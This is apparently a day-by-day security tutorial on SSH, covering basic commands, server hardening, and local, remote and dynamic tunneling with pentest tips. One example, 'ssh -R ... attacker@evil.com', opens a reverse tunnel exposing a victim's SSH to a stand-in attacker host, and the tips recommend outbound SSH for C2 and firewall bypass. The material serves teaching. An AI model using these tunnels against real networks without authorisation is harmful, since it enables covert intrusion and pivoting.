# Day 17 – Secure Shell (SSH) & Tunneling Tricks
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

SSH is essential for system administrators and hackers alike. It provides secure remote access, file transfer, and powerful tunneling capabilities that can be abused by attackers or used by pentesters for stealth operations.

---

## 🔹 SSH Basics
```bash
# Connect to a server
ssh user@target

# Copy a file to a remote host
scp file.txt user@target:/tmp/

# Generate SSH keys
ssh-keygen -t ed25519
```

---

## 🔹 SSH Hardening (Defense)
1. **Disable root login**  
   Edit `/etc/ssh/sshd_config`:  
   ```
   PermitRootLogin no
   ```

2. **Use key-based authentication only**  
   ```bash
   ssh-keygen -t ed25519
   ```
   Add your public key to `~/.ssh/authorized_keys`.

3. **Change default port (avoid 22)**  
   ```
   Port 2222
   ```

4. **Limit users**  
   ```
   AllowUsers alice bob
   ```

5. **Use Fail2Ban / UFW to block brute-force attacks.**

---

## 🔹 SSH Tunneling (Offense & Pentest Use)
Attackers and pentesters often use SSH to **bypass firewalls** and pivot into internal networks.   
SSH tunneling is a method of transporting arbitrary networking data over an encrypted SSH connection. It can be used to add encryption to legacy applications. It can also be used to implement VPNs (Virtual Private Networks) and access intranet services across firewalls.

### Local Port Forwarding
Access remote services via localhost:  
```bash
ssh -L 8080:localhost:3306 user@target
```
Now `localhost:8080` forwards traffic to target’s MySQL.

### Remote Port Forwarding
Expose local services to an attacker:  
```bash
ssh -R 4444:localhost:22 attacker@evil.com
```
Attacker connects back to victim.

### Dynamic Proxy (SOCKS)
Turn SSH into a SOCKS proxy:  
```bash
ssh -D 9050 user@target
```
Then configure `proxychains` to tunnel traffic.

---

## 🔥 Pentester Tips
- Firewalls often allow outbound SSH (22, 443). Exploit this for C2 or pivoting.  
- Use SSH tunnels to access databases, intranet sites, or restricted services.  
- Combine `proxychains` + SSH dynamic proxy for stealthy browsing.  

---

## ✅ Exercises
1. Harden your SSH server: disable root login & enforce keys.  
2. Create a local port forward to access a blocked service.  
3. Use SSH dynamic proxy with `proxychains` to browse internally.  

---

📢 Follow **@CyberSecPlayground** for more Linux hacking lessons, pentesting tricks, and real-world attacker simulations!
